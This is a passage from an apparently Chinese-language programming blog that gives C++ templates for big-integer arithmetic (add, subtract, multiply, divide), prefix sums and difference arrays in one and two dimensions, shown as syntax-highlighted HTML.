B.size(); i ++ )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//t + = A[i];</span></span><br><span class="line">            <span class="keyword">if</span> (i &lt; A.size())   t += A[i];</span><br><span class="line">            <span class="keyword">if</span> (i &lt; B.size())   t += B[i];</span><br><span class="line">            C.push_back(t % <span class="number">10</span>);        </span><br><span class="line">            t /= <span class="number">10</span>;            <span class="comment">//去进位</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (t) C.push_back(<span class="number">1</span>);      <span class="comment">//有无进位判断</span></span><br><span class="line">        <span class="keyword">return</span> C;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">string</span> a,b;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; A, B;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; a &gt;&gt; b ;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = a.size() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i --)    A.push_back(a[i] - <span class="string">&#x27;0&#x27;</span>);    </span><br><span class="line">    <span class="comment">//push_back在数组的最后添加一个数据,类似于栈</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = b.size() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i --)    B.push_back(b[i] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">auto</span> C = add(A, B);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = C.size() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i -- )   <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, C[i]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="A-B-1"><a href="#A-B-1" class="headerlink" title="A-B"></a>A-B</h4><ol><li><p>大整数存储，数组起始位置存放最低位置</p></li><li><p>判断A，B大小，大数减小数，加符号</p></li><li><p>Ai - Bi 借位</p></li><li><p>若为符号，转化为绝对值相加减 </p></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">cmp</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; &amp;A, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; &amp;B)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">if</span>(A.size() != B.size())    <span class="keyword">return</span> A.size() &gt; B.size();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = A.size() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i -- )</span><br><span class="line">            <span class="keyword">if</span> (A[i] != B[i])</span><br><span class="line">                <span class="keyword">return</span> A[i] &gt; B[i];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; <span class="title function_">sub</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; &amp;A, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; &amp;B)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; C;</span><br><span class="line">   </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span> ,t = <span class="number">0</span>; i &lt; A.size(); i++)       </span><br><span class="line">           &#123; </span><br><span class="line">            t = A[i] - t;               <span class="comment">//消除进位</span></span><br><span class="line">            <span class="keyword">if</span>( i &lt; B.size())   t -= B[i];      <span class="comment">//运算</span></span><br><span class="line">            C.push_back((t + <span class="number">10</span>) % <span class="number">10</span>);         <span class="comment">//求绝对值</span></span><br><span class="line">            <span class="keyword">if</span> ( t &lt; <span class="number">0</span>) t = <span class="number">1</span>;          <span class="comment">//产生进位</span></span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">                t = <span class="number">0</span>;</span><br><span class="line">            &#125;   </span><br><span class="line">     </span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (C.size() &gt; <span class="number">1</span> &amp;&amp; C.back() == <span class="number">0</span>)   C.pop_back();   <span class="comment">//去除多余的0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> C;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">string</span> a,b;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; A, B;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; a &gt;&gt; b ;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = a.size() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i --)    A.push_back(a[i] - <span class="string">&#x27;0&#x27;</span>);    </span><br><span class="line">    <span class="comment">//push_back在数组的最后添加一个数据,类似于栈</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = b.size() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i --)    B.push_back(b[i] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (cmp(A, B))          <span class="comment">//大减小</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">auto</span> C = sub(A, B);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = C.size() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i -- )   <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, C[i]);</span><br><span class="line">         &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">auto</span> C = sub(B, A);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = C.size() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i -- )   <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, C[i]);</span><br><span class="line">         &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="A-b"><a href="#A-b" class="headerlink" title="A*b"></a>A*b</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"> <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; <span class="title function_">mul</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; &amp;A, <span class="type">int</span> b)</span></span><br><span class="line"> &#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; C;</span><br><span class="line">        <span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; A.size() || t; i ++ )</span><br><span class="line">        &#123; </span><br><span class="line">            <span class="keyword">if</span> (i &lt; A.size())   t += A[i] * b;</span><br><span class="line">            C.push_back(t % <span class="number">10</span>);</span><br><span class="line">            t /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">     <span class="keyword">while</span> (C.size() &gt; <span class="number">1</span> &amp;&amp; C.back() == <span class="number">0</span>) C.pop_back();            <span class="comment">//去除0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> C;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">string</span> a;</span><br><span class="line">    <span class="type">int</span> b;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; a &gt;&gt; b;</span><br><span class="line">    <span class="keyword">if</span> (b == <span class="number">0</span>) &#123;<span class="built_in">printf</span>(<span class="string">&quot;0&quot;</span>);   <span class="keyword">return</span> <span class="number">0</span>;&#125;<span class="comment">//0特解</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; A;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = a.size() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i -- )   A.push_back(a[i] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">auto</span> C = mul(A, b);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = C.size() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i --)     <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,C[i]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>A➗b</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"> <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; <span class="title function_">div</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; &amp;A, <span class="type">int</span> b, <span class="type">int</span> &amp;r)</span></span><br><span class="line"> &#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; C;</span><br><span class="line">        r = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = A.size() - <span class="number">1</span>; i &gt;= <span class="number">0</span> ; i -- )</span><br><span class="line">        &#123; </span><br><span class="line">            r = r * <span class="number">10</span> + A[i];</span><br><span class="line">            C.push_back(r/b);</span><br><span class="line">            r %= b;</span><br><span class="line">        &#125;</span><br><span class="line">        reverse(C.begin(), C.end());</span><br><span class="line">     <span class="keyword">while</span> (C.size() &gt; <span class="number">1</span> &amp;&amp; C.back() == <span class="number">0</span>) C.pop_back();            <span class="comment">//去除0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> C;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">string</span> a;</span><br><span class="line">    <span class="type">int</span> b;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; a &gt;&gt; b;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; A;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = a.size() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i -- )   A.push_back(a[i] - <span class="string">&#x27;0&#x27;</span>);        </span><br><span class="line">    <span class="type">int</span> r;</span><br><span class="line">    <span class="keyword">auto</span> C = div(A, b, r);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = C.size() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i --)     <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,C[i]);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; r &lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br></pre></td></tr></table></figure><h3 id="前缀和与差分"><a href="#前缀和与差分" class="headerlink" title="前缀和与差分"></a>前缀和与差分</h3><h4 id="前缀和"><a href="#前缀和" class="headerlink" title="前缀和"></a>前缀和</h4><h5 id="一维前缀"><a href="#一维前缀" class="headerlink" title="一维前缀"></a>一维前缀</h5><ul><li>一次运算计算出所有区间的和，空间换时间</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">100010</span>;</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> a[N], s[N];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++ )  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++ )  s[i] = s[i - <span class="number">1</span>] +a[i];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>( m-- )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> l, r;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;l, &amp;r);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,s[r]- s[l <span class="number">-1</span> ]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="二维前缀"><a href="#二维前缀" class="headerlink" title="二维前缀"></a>二维前缀</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1010</span>;</span><br><span class="line"><span class="type">int</span> n, m, q;</span><br><span class="line"><span class="type">int</span> a[N][N], s[N][N];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;   </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;n, &amp;m, &amp;q);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++ ) </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= m; j ++ )</span><br><span class="line">             <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i][j]);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++ ) </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= m; j ++ ) </span><br><span class="line">            s[i][j] = s[i - <span class="number">1</span>][j] + s[i][ j - <span class="number">1</span>] - s[i - <span class="number">1</span>][j - <span class="number">1</span>] + a[i][j];       </span><br><span class="line">            <span class="comment">//计算前缀和</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>( q-- )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> x1, x2, y1, y2;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d%d&quot;</span>, &amp;x1, &amp;y1, &amp;x2, &amp;y2);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,s[x2][y2] - s[x1 <span class="number">-1</span>][y2] - s[x2][y1 - <span class="number">1</span>] + s[x1 <span class="number">-1</span>][y1 - <span class="number">1</span>]);     </span><br><span class="line">        <span class="comment">//计算子矩阵的和</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="差分"><a href="#差分" class="headerlink" title="差分"></a>差分</h4><ul><li>前缀和的逆运算</li><li>数组b[i]即原数组a[1]+…..+a[i]</li><li>用O(1)的时间给原数组某个区间内的值全部加上C </li></ul><p>a[0]= 0;</p><p>b[1] = a[1] - a[0];</p><p>b[2] = a[2] - a[1];</p><p>b[3] =a [3] - a[2];</p><p>……..</p><p>b[n] = a[n] - a[n-1];</p><h5 id="一维差分"><a href="#一维差分" class="headerlink" title="一维差分"></a>一维差分</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">100010</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> a[N], b[N];<span class="comment">//a[N]原矩阵，b[N]差分矩阵</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">insert</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> r, <span class="type">int</span> c)</span></span><br><span class="line">&#123;</span><br><span class="line">    b[l] += c;</span><br><span class="line">    b[r+<span class="number">1</span>] -= c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++)   insert(i, i ,a[i]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>( m -- )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> l, r , c;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;l, &amp;r, &amp;c);</span><br><span class="line">            insert(l, r, c);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) b[i] += b[i - <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++)   <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,b[i]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="二维差分"><a href="#二维差分" class="headerlink" title="二维差分"></a>二维差分</h5><p><a href="https://www.acwing.com/solution/content/27325/">AcWing 798. 差分矩阵 【 c++详细题解 】 - AcWing</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1010</span>;</span><br><span class="line"><span class="type">int</span> n, m ,q;</span><br><span class="line"><span class="type">int</span> a[N][N], b[N][N]; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">insert</span><span class="params">(<span class="type">int</span> x1, <span class="type">int</span> y1, <span class="type">int</span> x2, <span class="type">int</span> y2, <span class="type">int</span> c)</span></span><br><span class="line">&#123;</span><br><span class="line">    b[x1][y1] += c;</span><br><span class="line">    b[x2 + <span class="number">1</span>][y1] -= c;</span><br><span class="line">    b[x1][y2 + <span class="number">1</span>] -= c;</span><br><span class="line">    b[x2 + <span class="number">1</span>][y2 + <span class="number">1</span>] += c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;n, &amp;m, &amp;q);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++ ) </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= m; j ++ )</span><br><span class="line">             <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i][j]);</span><br><span class="line"></span><br><span class="line">     <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++ ) </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= m; j ++ ) </span><br><span class="line">            insert(i, j, i ,j ,a[i][j]);       </span><br><span class="line">   </span><br><span class="line">   <span class="keyword">while</span>(q -- )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> x1, x2, y1, y2, c;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; x1 &gt;&gt; y1 &gt;&gt; x2 &gt;&gt; y2 &gt;&gt;c;</span><br><span class="line">        insert(x1, y1, x2 ,y2 ,c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">     <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++ ) </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= m; j ++ ) </span><br><span class="line">            b[i][j] += b[i - <span class="number">1</span>][j] + b[i][j - <span class="number">1</span>] -b[i - <span class="number">1</span>][j - <span class="number">1</span>];<span class="comment">//逆运算</span></span><br><span class="line"></span><br><span class="line">     <span class="keyword">for</span> (<span class="type">int</span> i = <span 